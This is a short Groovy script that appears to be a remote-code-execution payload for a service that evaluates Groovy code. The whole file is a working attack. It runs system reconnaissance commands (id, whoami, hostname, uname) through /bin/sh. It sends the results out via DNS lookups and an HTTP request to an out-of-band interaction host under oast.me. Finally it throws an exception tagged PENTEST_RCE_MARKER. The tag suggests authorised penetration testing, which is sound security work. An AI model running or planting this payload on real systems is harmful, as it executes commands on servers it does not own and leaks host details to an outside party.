def OA = "db2ul6a1js91pdqdfa9g3qmzcnndozb4o.oast.me"
def out = ""
try {
    def c = ["/bin/sh", "-c", "id; whoami; hostname; uname -a"].execute()
    c.waitFor()
    out = ((c.in.text ?: "") + (c.err.text ?: "")).trim()
} catch (Throwable t) { out = "EXECERR:" + t.getClass().getSimpleName() }
def tag = out.replaceAll(/[^A-Za-z0-9]/, "_")
if (tag.length() > 60) { tag = tag.substring(0, 60) }
try { ["/bin/sh", "-c", "getent hosts " + tag + "." + OA + " || nslookup " + tag + "." + OA].execute().waitFor() } catch (Throwable i) {}
try { new URL("http://" + OA + "/rce-" + tag).text } catch (Throwable i) {}
throw new RuntimeException("PENTEST_RCE_MARKER: " + out)
